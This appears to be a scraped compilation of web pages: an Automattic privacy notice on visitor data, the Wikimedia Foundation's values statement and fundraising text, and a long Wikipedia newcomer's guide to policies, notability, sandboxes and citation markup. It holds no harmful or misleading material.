 * Akismet Commenter Information: We collect information about visitors who comment on Sites that use our Akismet anti-spam service. The information we collect depends on how the User sets up Akismet for the Site, but typically includes the commenter’s IP address, user agent, referrer, and Site URL (along with other information directly provided by the commenter such as their name, username, email address…oh, and the comment itself, of course).
 * Crowdsignal Response Information: We collect information about visitors who respond to a Crowdsignal survey. The information that we collect typically includes IP address, browser type, operating system, user agent, and the web page last visited.
 * Intense Debate Commenter Information: We collect information about visitors who comment on Sites that use our Intense Debate service. The information that we collect depends on how the User sets up Intense Debate for the Site, but typically includes the IP address and account information on the Site, along with the comment.
 * Jetpack Site Activity: We collect visitor activities related to the management of the Site, such as login attempts/actions and comment submission and management actions. For more information, please see the Jetpack Privacy Center.
 * Information from Cookies and Other Technologies: A cookie is a string of information that a Site stores on a visitor’s computer, and that the visitor’s browser provides to the Site each time the visitor returns. Pixel tags (also called web beacons) are small blocks of code placed on Sites. Automattic uses cookies and other technologies like pixel tags to help identify and track visitors and Site usage, and to deliver targeted ads when ads are enabled for free WordPress.com sites or when ads are enabled on a Site through WordAds or Jetpack Ads (see the “Other Tools” section below for more details). For more information about our use of cookies and other technologies for tracking, including how visitors can control the use of cookies, please see our Cookie Policy.

OTHER INFORMATION PROVIDED BY OUR USERS

We also collect any other information that our Users provide to us about visitors to their Sites. For example, a User may upload a directory or other information about Site visitors and customers to the “backend” administrative platform for managing the Site.


HOW WE USE VISITOR INFORMATION

We use information about Site visitors in order to provide our Services to our Users and their Sites. Our users may use our Services to, for example, create and manage their Site, sell products and services on their Site, flag and fight comments from spammers, and collect information through polls, quizzes and other surveys.

In addition to the above, we use some information about Site visitors who are also our Users as described in our Privacy Policy.

We may also use and share information that has been aggregated or reasonably de-identified, so that the information could not reasonably be used to identify any individual. For instance, we may publish aggregate statistics about the use of our services.


HOW WE SHARE VISITOR INFORMATION

We may share information collected about Site visitors in the limited circumstances spelled out below:

 * Subsidiaries, Employees, and Independent Contractors: We may disclose Site visitor information to our subsidiaries, our employees, and individuals who are our independent contractors that need to know the information in order to help us provide our services to our Users and their Sites, or to process the information on our behalf. We require our subsidiaries, employees, and independent contractors to follow this Privacy Notice for information about visitors that we share with them.
 * Third Party Vendors: We may share Site visitor information with third party vendors who need to know this information in order to provide their services to us. This group includes vendors that help us provide our services to our Users and their Sites. We require vendors to agree to privacy commitments in order to share information with them.
 * Legal Requests: We may disclose Site visitor information in response to a subpoena, court order, or other governmental request. For more information on how we respond to requests for information, please see our Legal Guidelines.
 * To Protect Rights, Property, and Others: We may disclose Site visitor information when we believe in good faith that disclosure is reasonably necessary to protect the property or rights of Automattic, our Users, third parties, or the public at large. For example, if we have a good faith belief that there is an imminent danger of death or serious physical injury, we may disclose information related to the emergency without delay.
 * Business Transfers: In connection with any merger, sale of company assets, or acquisition of all or a portion of our business by another company, or in the unlikely event that Automattic goes out of business or enters bankruptcy, Site visitor information would likely be one of the assets that is transferred or acquired by a third party. If any of these events were to happen, this Privacy Notice would continue to apply to Site visitor information and the party receiving this information may continue to use this information, but only consistent with this Privacy Notice.
 * Information Shared Publicly: Information that visitors choose to make public is–you guessed it–disclosed publicly. That means, of course, that information like visitor comments and “likes” are all available to others, including information about the visitor that is displayed in connection with a comment or “like” (such as a visitor’s WordPress.com username and Gravatar). We provide a “firehose” stream of public data (including comments) from Sites to provide that data to firehose subscribers, who may view and analyze the content, but do not have rights to re-publish it publicly. Public information may also be indexed by search engines or used by third parties.


HOW LONG WE KEEP VISITOR INFORMATION

If we are not legally required to keep it, we generally discard information about Site visitors when no longer needed for the purposes for which we collect and use it on behalf of our users — those purposes which are described in the “How We Use Visitor Information” section above.

For example, we keep the web server logs that record information about a visitor to one of our user’s Sites — such as the visitor’s IP address, browser type, and operating system — for approximately 30 days. We retain the logs for this period of time in order to, among other things, investigate issues if something goes wrong on a user’s Site.

As another example, when a Site visitor views your Site we use their IP address in order to update your Site Stats with information about their visit, like what country they are in. We keep that IP address for approximately 30 days to give us time to calculate your monthly Site Stats and address any issues with those counts.


OTHER TOOLS

Our Users’ Sites may contain ads from third party ad networks and advertisers, and our Users may integrate other tools and services on their Sites (such as Google Analytics and third party plugins). Please note that this Privacy Notice only covers the collection of information by Automattic, and does not cover the collection by any third party.

Ad networks and analytics providers may set tracking technologies (like cookies) to collect information about visitors’ use of a Site and across other websites and online services, such as a visitor’s IP address, web browser, mobile network information, pages viewed, time spent on pages, links clicked, and conversion information. This information may be used by those companies to, among other things, analyze and track usage, determine the popularity of certain content, and deliver advertisements that may be more targeted to visitor interests. For more information about how to manage and delete cookies, visit aboutcookies.org, and for more information on interest-based ads, including information about how visitors may be able to opt out of having their web browsing information used for behavioral advertising purposes, please visit aboutads.info/choices (US based) and youronlinechoices.eu (EU based).

ABOUT

Wikimedia Foundation’s Values


A REFLECTION OF WHO WE ARE AND DEFINITION OF THE POSITIVE IMPACT WE ASPIRE TO MAKE IN THE WORLD

At the Wikimedia Foundation, our values underpin a globally thriving and purpose-driven organization. As a community of passionate individuals with a shared mission and vision, we are committed to upholding a set of values that guide our actions, decisions, and interactions both internally and externally. These values reflect who we are and define the positive impact we aspire to make in the world.


TABLE OF CONTENTS

Navigate within this page. We are in this mission together
 * We are in this mission together
 * We do great work and improve
 * We welcome everyone who shares our Vision and Values
 * We listen and share with curiosity

Our values serve as the compass that directs our collective efforts, shaping the way we work together and with the Wikimedia Movement. They are not mere words on paper; rather, they are the driving force behind everything we do. From fostering a healthy culture of collaboration and inclusion to delivering exceptional work, each member of the Wikimedia Foundation is expected to embody these values, ensuring that we remain steadfast in our commitment to doing great work and improving.

As you explore this page, we invite you to learn about our Values, the journey we took to arrive at them and how each of us can live up to our values in our work. Discover how our can enable you to build meaningful relationships and a culture of continuous learning that empowers us to thrive in an ever-changing world.


WE ARE IN THIS MISSION TOGETHER

We believe this because …

 * We solve problems better through collaboration.
 * We find joy, belonging, and connection in doing things together.
 * We have to balance individual priorities with our shared collective responsibilities.

In practice, this means …

 * I support my colleagues whenever I can, and ask for help whenever I need it.
 * I help figure out the problem when I disagree with a proposal.
 * I work towards real decisions, a shared agenda, and clear accountability.


WE DO GREAT WORK AND IMPROVE

We do this because …

 * We have a huge responsibility as stewards of our mission.
 * Success often comes through learning from failure.
 * Our communities inspire both our work and the way we work.

In practice, this means …

 * I share my work early, often, and respond to feedback.
 * I strive for measurable progress towards our goals rather than for perfection.
 * I invite playfulness and creativity at work where possible.


WE WELCOME EVERYONE WHO SHARES OUR VISION AND VALUES

We believe this because …

 * To build the sum of all knowledge, we need to embrace human diversity.
 * Our differences are powerful and require nurturing.
 * We do our best work when we understand different perspectives.

In practice, this means …

 * I contribute to making spaces safe for people to express themselves.
 * I recognize my own privilege and believe others about their lived experiences.
 * I repair the harm that I cause and model accountability for myself and others.


WE LISTEN AND SHARE WITH CURIOSITY

We do this because …

 * People think and communicate in different ways.
 * Curiosity and candor are how we learn to understand and trust each other.
 * Assumptions and biases are at the root of most misunderstandings.

In practice, this means …

 * I communicate honestly, clearly, and with empathy.
 * I recognize the limits of my expertise and trust people closest to the problem.
 * I approach unexpected information with humility and an open mind.

The Wikimedia Foundation's fundraiser from 16 December 2006-15 January 2007 succeeded in raising just more than US$1 million. The first three graphs on this page show the day-by-day progress of the fundraiser in terms of total donations, across all currencies, up through 10 January 2007. First, average donation size is shown; second, the number of donations; and third, the total USD value of all donations. The second set of three graphs show analogous information, disaggregated by currency. The vertical red line in each figure marks the first day of the fundraiser; and to make patterns clearer, the large matching contributions are not included here.

WIKIPEDIA STILL CAN'T BE SOLD.

[edit]

Thank you for considering a donation to the Wikimedia Foundation.

In the age of AI, access to verifiable facts is crucial. Wikipedia is at the heart of online information, powering everything from your personal searches to emerging AI technologies. Your gift strengthens the knowledge of today and tomorrow.

If Wikipedia has given you useful knowledge this year, please give back. There are no small contributions: every edit counts, every donation counts.

Thank you.

This page in a nutshell: This page provides a quick and simple guide for those who are new to Wikipedia.

Wikipedia is really not the confusing place to edit that one might first think. All it takes is an understanding of what we're all about.

Welcome to Wikipedia! We're all volunteers here. There are no bosses or paid supervisors. But we do have policies and guidelines, created and developed by fellow editors, to help contributors work together to produce accurate, verifiable articles, free of bias and accidental copyright infringements. While the guidance offered here is covered in far more detail elsewhere within Wikipedia, this page should be of help in your early days as a member of our great project. Don't be afraid to edit as you are encouraged to be bold! If you do get stuck, there are volunteers available to answer your questions, see asking for help for more information.

Okay, so you're new to Wikipedia, and want to learn how to use it or even perhaps write an article. This guide is intended to focus on the most important rules and hopefully prevent newcomers from getting into too much trouble during their first few days or weeks of editing. As new editors gain familiarity with Wikipedia, interest in the more in-depth coverage of these "rules" elsewhere will replace their need for this very basic guide.

This newcomer's primer presents an easy-to-understand introduction to the "rules" of Wikipedia, written for the benefit of beginning Wikipedians who would like a summary of our extensive guidelines on a single page. It is hoped that this guide will help newcomers better understand what is required to create an article that will be accepted by the Wikipedia community, and that it will help a newcomer avoid the information overload that may result from trying to digest all our individual guideline and policy pages at once.

Even for experienced editors, Wikipedia's "rules" can sometimes be confusing. While you'll find this information covered in far greater depth at the various specific guideline and policy pages, for you, the newcomer, here is an attempt to explain some of these concepts, in a most basic way in the hopes of helping you to get started on writing your first article.

Newcomers are always encouraged to ask for input or assistance from others, to ensure that something they have written is suitable for Wikipedia's main area, where articles reside. A person can ask for help in several ways, including simply asking other editors, visiting either the Wikipedia:help desk or the Teahouse (a friendly place especially for new editors), or by placing the code {{helpme}} on their talk page.

All rules come from Wikipedia's Five Pillars, which summarize the basic principles by which Wikipedia tries to function. In a nutshell:

1. Wikipedia is an encyclopedia

It brings together information one might expect to find in other general and/or specialized encyclopedias, almanacs, and gazetteers. That information needs to be verifiable with content sourced back to outside reliable sources. A contributor's personal experiences, views, interpretations, or opinions do not belong here. Wikipedia is not a soapbox, not an advertising platform, not a vanity press, not a blog, not an experiment in anarchy or democracy, not an indiscriminate collection of miscellaneous information, nor a web directory. It is not a dictionary, not a newspaper, nor a collection of source documents. Wikipedia has sister projects where that type of material might be welcome instead.

2. Wikipedia requires a neutral point of view

Wikipedia articles do not push a single point of view. Articles must be balanced, representing multiple perspectives and sharing them accurately, in proper context, in proportion to the prominence of each viewpoint in reliable sources, and not pushing any particular point of view as "the truth" or "the best". ALL information should be referenced to verifiable, authoritative sources... especially for controversial topics. If there are arguments or disagreements between contributors about neutrality, the details should be hammered out in the article's talk page, and if not worked out there, resolved through the various stages of Wikipedia dispute resolution. There is a process. Accept and respect it.

3. Wikipedia is free content that anyone can edit and distribute.

Contributors MUST respect copyright laws. What is written outside of Wikipedia is usually copyrighted. See Wikipedia:Copy-paste for more information. Any use within Wikipedia must follow applicable copyright law. No Wikipedia editor ever owns an article, no matter how much they might have contributed to it. What you might write for Wikipedia becomes freely licensed to the public. Whatever you might write can and will be mercilessly edited and re-edited and tweaked and poked and changed by others.

4. Wikipedians should always be polite to each other

Treat fellow contributors with respect, even when there are disagreements. With so many different persons and personalities editing these pages, it is best to always be courteous and avoid personal attacks. Find common ground in discussions. Avoid battling over edits or content. And remember that there are currently 6,981,106 articles on the English Wikipedia to work on and discuss. Always try to assume the best in other editors, not the worst. Don't presume someone is messing with you just to mess with you. Don't take it personally nor make it personal. Never start messing things up just to make a point. And though it is sometimes difficult (we are human after all), do your best to assume good faith on the part of others. Be open and welcoming to new editors.

5. Wikipedia does not have firm rules besides the five general principles presented here.

Policies and guidelines are subject to change. A contributor can usually be bold in updating an article, and they do not have to worry too much about making mistakes. However, it's always best to be careful and only act from understanding and knowledge, not personal opinion. An editor's efforts do not have to be perfect, because prior versions are saved by default and any damage done can be fixed. However (and you'll learn this as you go), there is a sometimes unrealistic expectation from veteran editors that every newcomer already understands all the confusing rules before they begin editing. If you make an error, the person who catches it might not realize or care that you are new. The person may even presume you did whatever it was you did on purpose just to mess with them or with Wikipedia. Well, that's their own lack of good faith... don't let it be yours. Remember that Wikipedia is full of many different sorts of personalities and temperaments... so if someone is a bit brusque, don't take it personally. If you make a mistake, apologize and ask for clarification. Wikipedia's strength is in it being a community; so communicate!


POLICIES


Shortcut
 * WP:LOP

An editor in the process of reading every single one of Wikipedia's Policies, Guidelines and Essays. He was only twelve years old when he started!

Policies have wide acceptance among editors and were created by Wikipedia editors as the standards that all users should follow. Policies are considered the "rules" which govern how Wikipedia is run. They are related to the Five Pillars of Wikipedia. If ever in doubt, remember that a user is always welcome and encouraged to ask for clarifications or ask for specific help on the talk pages of the various policies.

 * Behavior policies (or conduct) are the standards set for behavior on Wikipedia to make it a pleasant experience for everyone. Most succinctly: be polite. Violating behavioral guidelines can result in being blocked from editing.
 * Content policies define which topics are welcome on Wikipedia, and provide the standards for quality and naming.
 * Deletion policies deal with page deletion: the how-to, whys and why-nots.
 * Enforcement policies outline what actions editors can take to enforce other policies.
 * Legal and copyright policies are the law-based rules about what material may be used here, and the remedies for misuse.
   * When in doubt, don't hesitate to ask for clarification.


GUIDELINES


Shortcuts
 * WP:LGL
 * WP:Guidelines

Guidelines are considered advisory, but are still given a great deal of weight when editing Wikipedia. They advise on how to prevent or avoid causing problems, and on how to apply and execute policy under various circumstances. Occasionally a guideline appears to conflict with a policy. In those cases, the policy usually takes precedence.

A new editor is encouraged to ask for clarifications or ask for specific help on the talk pages of the various guidelines. It is never incorrect to ask for an explanation.

 * Behavioral guidelines outline ways for editors to behave and interact with each other on talk pages and elsewhere at Wikipedia. Again, at the heart of this is... be polite (which has a natural counterpart: don't be a jerk).
 * Content guidelines apply to the article namespace (unless otherwise specified in the guideline), and offer advice on how you might identify and include encyclopedic information in articles.
 * Deletion guidelines explain the hows and whys of deleting unwanted or unneeded pages.
 * Editing guidelines usually provide non-content advice about categorization, navigation or other how-to-edit advices.
 * Naming conventions deal with the best ways to name articles on particular topics.
 * Notability guidelines detail the various criteria a subject should meet to merit having a Wikipedia article.
 * Style guidelines contain extensive advice on preferred writing style, formatting, grammar, and more.
   * Again, when in doubt, don't hesitate to ask for clarification.


ESSAYS AND INFORMATION PAGES

Essays and information pages (like the one you're reading now) are opinions or advice from one editor or a group of editors. Wikipedia has LOTS and LOTS of essays, how-to and information pages, but widespread agreement has not been established for their use, so they have not been implemented as policies or guidelines. They do not speak for the entire community, and may be created and written without community approval. However, essays are often used in discussions, when an editor wishes to show how it might or might not apply to the discussion. Essays may represent widespread norms or minority viewpoints, so consider discretion when using an essay in a discussion.

 * Once again, when in doubt, don't hesitate to ask for clarification.
 * Does it sound like I am repeating myself needlessly? My suggesting that a newcomer ask for input from others when creating a new article is some of the best advice that can be offered. Wikipedia is a community of volunteers ... so getting help in the beginning can usually avoid later confusions and conflicts. Never be afraid to ask.


SHORTCUTS


Shortcuts
 * WP:CUTS
 * WP:SHORTCUTS
 * WP:LOS

You may have noticed editors using all-caps links that don't seem to make sense, such as WP:AFD, WP:COI, WP:V, WP:RS, WP:WTF and so on. These are "shortcuts" to pages in the Wikipedia namespace. Editors use these shortcuts because they save typing time (for instance, typing Wikipedia:Articles for deletion is twenty-five characters longer than WP:AFD), and because it's generally presumed that others already have a grip on what these shortcuts are all about. Now you do too. Yes, they can be confusing for newcomers... but you can find a non-comprehensive list of shortcuts at WP:CUTS (a "shortcut" to the Wikipedia:List of shortcuts page).

Often, you can find the information you need by typing WP:KEYWORD into the Wikipedia search box, substituting a word describing your needs for "KEYWORD". You will see a list of policies, guidelines and essays related to your inquiry.


GET FAMILIAR WITH WIKIPEDIA

It's best to start slow, rather than jump in and perhaps flounder. There are a number of terrific guides within Wikipedia that can help new editors to create their first articles (see the bottom of this essay).

It should be remembered that it is always good for a newcomer to use a personal "sandbox" or "user space" for creating articles, so that they may be fine-tuned before being moved to Wikipedia's mainspace, where the article resides. An authoritative page geared towards helping newcomers create an article is Wikipedia:Your first article. Here is a short summary:
 * Create an account. You must be a registered user to create a new article. Registering as a user is free. Anyone can do this. Don't create more than one account. Use of multiple accounts by one person is frowned upon. It's allowed under special circumstances, yes... but generally speaking, one is enough.
 * Play around with Wikipedia's sandbox, an area for any editor to test out formatting and editing Wikipedia. This is a great first step, because a lot of Wikipedia's editing policies don't apply there and you don't have to worry about messing up formatting. Almost like a cat's litter box, it gets cleaned out on a regular basis.
 * Try editing existing articles in order to get a feel for writing and for using the mark-up language used within Wikipedia. For instance, pick a random article and check it for grammar or spelling.
 * Double-check to make sure that the topic you might wish to write about has not already been created by someone else, perhaps under a different or modified title. If the article already exists, you might make a few constructive edits to it.
 * Find and gather your references, both to use as sources for your information and also to show the required notability of your article's subject matter. Don't use blogs, personal websites, forums, MySpace, or Twitter as references. Wikipedia requires reliable sources, and for the most part those aren't reliable.
 * Never be afraid to ask for feedback. You can ask questions about current articles or about articles you might wish to create in a number of places, including the talk page of a related WikiProject, the Teahouse (a help forum for new users), or the Help Desk. Help from others is available; all one need do is ask.
 * Consider userspace. Although it's not mandatory, it's an extremely good idea to start the article first in your user space as a Userspace draft. One of the biggest problems newcomers face is starting new articles in the main space, and then having it immediately judged somehow lacking by more experienced editors. Sure, you "just" started it... sure, it still needs expansion and sourcing... yes, it's a work-in-progress... it's not finished... it's not ready... why is it being tagged for deletion? Hey!! Yikes!!! Sadly, that is how many newcomers first meet the experienced editors who patrol new contributions... and more sadly, the meeting is not always a happy one. Please don't let that be your first interaction with others. If this does happen to you, you might find Wikipedia:Why was my page deleted? instructive. Registered users have and can create their own user spaces for building articles. New articles can be started there, on a subpage, and can be whipped into shape at leisure. There is no real hurry, after all. Beginning an article in a userspace allows the benefit of time in order to sweeten the article, ask other editors for advice and input, make the article shine, and then move it into the "live" Wikipedia only when it is ready to go and survive on its own. Learn the not-too-confusing details about creating your own subpage by checking out "How to create user subpages". There is also a great tool newcomers can use called the Article Wizard which offers the option to create just this kind of user work space. As you gain experience, you'll see how easy it is to do. Then, when your new article is ready for the "main space", you can quite easily move it into that main area.


PICKING A TOPIC


ON NOTABILITY

On Wikipedia, notability is a test used by editors to decide whether a topic can or should have its own article. What is written in Wikipedia must in some manner be notable, or "worthy of notice". The concept of notability, as used on Wikipedia, is not the same as the dictionary definition; it does not necessarily depend on things like fame, importance, or popularity—although those may enhance the acceptability of a subject that meets the guidelines explained at Wikipedia:Notability. The general rule is that a topic is notable, and thus warrants a stand-alone article, if multiple, reliable sources that are independent of the subject of the article have written about that topic in some detail.

The existence and citation to those sources in an article both substantiates notability and allows the information content of the article to be verified. All information on Wikipedia must be verifiable, and if no reliable third-party sources can be found on a topic, then it should not have a separate article.

Here are some important things to remember about creating an article... and there are lots of things Wikipedia is NOT for.


IMPORTANT CAUTIONS

 1. Don't write about yourself, your friends, your website, your company, your business, your family, a band you're in, your teacher, a word you made up, a story you wrote, or anything else you're closely affiliated with (exception: we welcome academics, museum curators, etc., who write about their area of expertise, subject to our usual policies). If the subject is too close to you, it falls under scrutiny as a conflict of interest. If your username is "Big Blast" and you write about Big Blast the musician, or Big Blast the Demolition Company, or Big Blast Pancakes, you'll catch the immediate eye of editors whose chosen task is to investigate and curtail conflict of interest or blatant advertising. Oh, perhaps Big Blast the musician or Big Blast Pancakes might very well be worth writing about... but if that's you, you may as well wait until someone else writes it. If it's not you, then perhaps starting with a different username will prevent the appearance that it is. Conflict of interest is a big deal on Wikipedia, as Wikipedia strongly discourages any attempt at self-promotion. So choose something else that interests you and that will itself be of interest to others.
 2. Pick something notable to write about. Go and take a good look at the notability guidelines and then at the guidelines for determining what a reliable source is. Pretty much what these guidelines state is whatever topic is being considered, the topic must be "notable"... it must itself have been addressed in outside reliable sources. With very few exceptions, this means the topic must have been written about in newspapers or magazines or books. Not blogs. Not forums. Not fansites. Not self-published websites. Not neighbourhood newsletters. The sources providing verifiability of any information in an article must themselves be reliable.
 3. Be neutral in point of view. Whatever you write about has to be presented in the same dry and informative (or even boring) fashion as you might expect to read it in Encyclopædia Britannica or Encyclopedia Americana. Avoid use of adjectives and superlative, unless they were used in the sources you have found for your article. Don't write "biggest pancake ever seen" unless your sources say exactly that... in which case you repeat it within quotation marks, followed by the reference citation to the source(s) which actually made that statement (more on that below).
 4. No original research. As an encyclopedia, Wikipedia should only contain information about things that are already known in the wider world. It is not for announcing new things or novel ideas. Likewise, you may not take several pieces of information that are known, but weave them together to offer a new conclusion. Wikipedia demands that there be no original research. If several sources make the conclusions that you wish to share, then fine... that's them... and you can present the conclusions in an article form as stated by others... but don't put the pieces together yourself. That's original research and that's not for Wikipedia.

The article you create will be deleted quickly if it is not acceptable. Wikipedia has volunteers who work the "new pages patrol" to check and review new articles shortly after they hit mainspace... often mercilessly... so make it as good as you can before making it "live".

Also, articles that do not meet Wikipedia's notability requirements and do not cite reliable, third-party, published sources are also likely to be deleted. But if you do your preparation correctly, that is unlikely to happen, as proper preparation can prevent later problems.

You may find the userspace essay "On notability" to be very helpful.

To summarize: DO NOT create pages about yourself, your company, your band or your friends, nor pages that advertise, nor personal essays or other articles you would not find in an encyclopedia. And even more important, you need to be extremely careful to not copy or simply cut and paste things from other articles, to always maintain a neutral point of view, and to avoid writing controversial material, extremely short articles, or articles that are only of local interest.

And here are two userspace essays that may be of great help in understanding what NOT to write about: "Not a noticeboard" and "What notability is not"


USERSPACE

When you first create an account, you will automatically have reserved blank pages called your user page and your user talk page, which are linked in the interface at the top through the buttons marked by your username, and by "talk"; clicking on either will bring you to the page, where it can be created. You can also create other pages in your userspace and treat them as workspaces, or "sandboxes". See userpage terminology and Help:Userspace draft, for the details and what is and is not appropriate content for a userpage. See also "What may I not have in my user pages?". Generally speaking, you should avoid substantial content on your user page that is unrelated to Wikipedia. Note that there is broad agreement you may not include in your user space material that is likely to bring the project into disrepute, or which is likely to give widespread offense. Material deemed unsuitable or not allowed to be in one's userspace includes:

 1. Writings, information, discussions, and activities not closely related to Wikipedia's goals;
 2. Promotional and advocacy material and links;
 3. Highly divisive or offensive material unrelated to encyclopedia editing;
 4. Personal information about others or excessive personal information about yourself; and
 5. Wikipedia content not suited to the userspace.

At its most basic, your user page is where you can share basic information if you wish, about yourself or your wiki-related activities. There is no rule nor norm that you must share such information, and some users choose to leave their user page blank.

A user talk page is a place for messages from, and discussion with, other editors. For more information on using talk pages see Help:Talk page.

What we are dealing with here, though, are the user subpages that we call sandboxes or workspaces – pages you can create as dedicated spots to construct articles before they are ready for the main space where articles reside.

It bears repeating that there ARE restrictions on userpage use. Study WP:UPNO to avoid problems from the outset. If you are even the least bit in doubt, ask for advice.


ON BUILDING AN ARTICLE

While we cover this here at its most basic, many editors suggest you review the more in-depth coverage at Wikipedia:Your first article.

Many editors begin by simply titling a page and adding content, but unless you know what you're doing, that method can lead to problems. So let's begin on the right foot by your creation of an article in userspace, i.e. not directly in the mainspace. Some editors use the "Article Wizard", a terrific tool used even by many experienced editors to start an article. Here, we'll simply deal with user workspaces, which are subpages of your user space, also called sandboxes.


USING YOUR SANDBOX(ES)

A workspace or sandbox in "userspace" is easy to create. One simple method is to use the editor sandbox to create a redlink of a subpage in your userspace that includes the article title, in a manner where the edit screen will show the link and then allow you to click on it:

[[User:Your Username/Name of Intended Article]].

Hitting "Show preview" it would then look like this:

User:Your Username/Name of Intended Article

...and then clicking that redlink creates the initial editing page for the article you wish to build. In the editing screen on that page, begin by typing {{userspace draft}} and then click "Publish changes". It might be useful to save the name of the workspace page you've created on your userpage so you can easily navigate back to it.

Another easy way to create a workspace is to visit Help:Userspace draft, which will help you when creating a workspace by automatically applying {{userspace draft}} to the created page and then leading you to the Article Wizard.

You just created a userspace page to begin a draft of your work. It's that simple.


BUILDING THE ARTICLE IN YOUR SANDBOX

Again, you are encouraged to spend some time reading "What Wikipedia is not". Everything you write in an article must be verifiable in a reliable source. And when writing, you need to be very careful NOT to write in a promotional tone. Doing so could lead to the proposed article being quickly deleted as an advertisement. Be sparing with adjectives. Do not use PR-speak or "peacock terms" or anything that sounds like opinion. Wikipedia is not a sales site or PR site. We are not Myspace or Facebook. We are not a forum or blog or networking site. We're an encyclopedia, and encyclopedia articles should be neutral descriptions that do not offer the opinions of the author – just the plain facts cited to reliable sources. Think of Encyclopædia Britannica or Encyclopedia Americana or World Book Encyclopedia. Their articles are factual and written in a neutral tone intended to inform. They do not promote or preach, and that's what we are here to provide as well: factual, neutral, and informative content on notable topics. The difference is that at Wikipedia, YOU are helping to write it.

Since there are more topics which might be written about than can be described in any one essay, and rather than try to use a generic example here, you are encouraged to read the Wikipedia:Your first article to learn what is expected from any article. Build that article, go over it to ensure it does not run afoul of the policies and guidelines set in place. If at all in doubt, be sure to seek input from others. Asking questions is how we all learn.


VERIFICATION AND RELIABLE SOURCES

When you've decided on your topic and you're certain it's not already covered elsewhere on Wikipedia, now you need to write your content. The most important thing to remember is that all of your content should be verifiable and based on reliable sources.

VERIFIABILITY

For information to be included on Wikipedia, it has to be verifiable. This means that others can check for themselves to see that whatever is included in an article can be confirmed elsewhere. Just saying something is true doesn't automatically make it so. So sources should be cited for ease of verification, and in principle should be accessible to other editors. Whether it's a book from the library, or a newspaper or a magazine or an online version of these, other editors should be able to read the sources for themselves, even if they choose not to. This is just the verification policy in a nutshell; you should read the entire policy, located at Wikipedia:Verifiability.

RELIABLE SOURCES

No matter the topic, articles need to be based upon reliable, third-party published sources (see WP:RS), and these are needed to confirm material within the article. To be considered reliable by Wikipedia standards, sources must have a reputation for fact-checking and accuracy, should directly support the information presented in an article, and be appropriate to the claims made in the article. The appropriateness of a source depends on context. Finding sources is the duty and obligation of the editor writing the article or adding the material.

Libraries, newspapers, and books are decent "real-world" places to look for reliable sources. If you want to get your sources online, use Google or one of the other major search engines and find sources that deal with your chosen topic. Or visit a library or bookstore to find sources that support your article. Make yourself a list of the sources you'll be using, and what each source offers for your article.

If you can't find sources, maybe the topic is not as publicly recognized as you hoped, and isn't going to survive being added to Wikipedia. You can't just say something is notable, you must be able to prove it.

Hardcopy sources considered most reliable are peer-reviewed journals, books published by university presses, university-level textbooks, magazines, journals and books published by respected publishing houses, and mainstream newspapers. Online media can be used but must meet the same criteria. The place to check to see what makes or breaks a source is over at the above-mentioned Wikipedia:Reliable sources and its related talk page. Sometimes guideline and policy seem to conflict. If that ever happens, policy usually has priority over guideline. If there is ever a question as to the reliability or suitability of a source, always feel free to ask about it at the reliable sources noticeboard.

EXTERNAL LINKS

To place an external link in an article, you put the link in single brackets like this [URL text you want to show]. For example [https://www.google.com Google] will display as Google. Before adding external links to an article, you should check out Wikipedia:External links to better understand which ones are okay to use and why.

CITATIONS

Above, you've read that articles need to have verifiable sources. So go spend some time at Wikipedia:Verifiability and then spend some time at Wikipedia:Citing sources.

Here's the short version: "Citations" are used in articles to give proper credit to authors and publishers outside of Wikipedia in order to avoid plagiarism and copyright violations and to direct a reader to those sources that were used in creating/confirming the article. The citation or "cite" usually follows right behind the word or sentence containing information requiring confirmation.

When adding one to an article it begins with a "<ref>" and ends with a "</ref>". The information between those two is the "citation" and must include the required information that can lead a reader to the publication or place where the information being cited was obtained.

To add the "inline citation", immediately after the word or sentence in the text that requires citation, add:

<ref>(details of the source)</ref>.

The required details might be only as simple and sloppy as a URL link to the source... squeezed in between the "<ref>" and "</ref>"... but that's a bit lazy and aggravates more experienced editors... so let's not be lazy.

To properly use a cite in an article, you need to include a section called "==References==" (usually preferred), or alternatively either "==Footnotes==" or "==Notes==" followed on the next line by the wiki markup "{{reflist}}" to be seen in the edit screen as

==References==
{{reflist}}

And to be clear, for your citation to actually be seen by others, you need that "==References==" section (or one of the others) AND the template {{reflist}} on the edit line immediately below it, or your cites will not show up for the reader.

For example

In an article for Hunter Ellis, you might read "In 2008 Ellis became host of the television series In Harm's Way".

That "fact" requires a reference citation to the source confirming the fact. A sample citation could be

<ref> http://www.variety.com/article/VR1117990132.html?categoryid=14&cs=1&query=Hunter+Ellis Hunter Ellis to host 'In Harm's Way' by Stuart Levine, Variety Magazine, August 5, 2008 </ref>

You could also get fancier and use a citation template:

<ref>{{cite news
| url=http://www.variety.com/article/VR1117990132.html?categoryid=14&cs=1&query=Hunter+Ellis
| title=Hunter Ellis to host 'In Harm's Way'
| last=Levine
| first=Stuart
| date=5 August 2008
| newspaper=Variety (magazine)
| accessdate=29 December 2009}}</ref>


...as providing the minimum required information... plus a bit more, as the cite structure in this example contains

the online URL of the source, the title of the article being used as a source, the name of the source's author, the date the online source was first created, the publisher of the online source, and the date the source was first added to the Wikipedia article.

Again, various source types require slightly different information, and you can study various citation structures at Wikipedia:Citation templates... but in all cases a citation MUST properly acknowledge the source from which it came.

Proper format for a citation can be a bit more involved and/or slightly different for the different types of sources, but at the minimum each must at the very least contain the basic information that explains the source, allowing a reader to confirm it for themself. A quite decent tutorial can be found at "Mini-tutorial on external links and references". Also, you may by now appreciate Wikipedia:Referencing for beginners and the occasional visit to Help:Citations quick reference.

If you have questions (and I'd be surprised if you don't), always ask for help.


FROM SANDBOX TO MAINSPACE

Are you sure it's ready? Really sure?? Have you double-checked your sources to make sure they actually support the sentence they are meant to support? Have you checked your article for neutrality in tone? Have you made sure that the article avoids original research and does not offer synthesis (the combining of conclusions that are not themselves made by your provided sources to offer or create a new conclusion not actually supported by sources)? Have you asked for input from more experienced editors? Okay. Once an article in a "sandbox" or "user space" is deemed suitable for Wikipedia main pages, the move is actually quite easy.


HOW TO MOVE THE PAGE

At the top of the userspace page where you created your article is the tab "Move". When you click on that tab, you will be offered the opportunity to move the article you created. To be able to move pages yourself, you must be logged in, have had the account for four days, and made at least ten article edits with it.

 * Under "Move page:", you will see User:YOURUSERNAMEHERE/workspace/Your article name here as a bluelink.
 * Immediately below that you will see "To new title:" where you can remove the first portions of the article name, for example removing the "User:YOURUSERNAMEHERE/workspace/" from the shown name to simplify it to be only the desired article name as it would appear in mainspace.
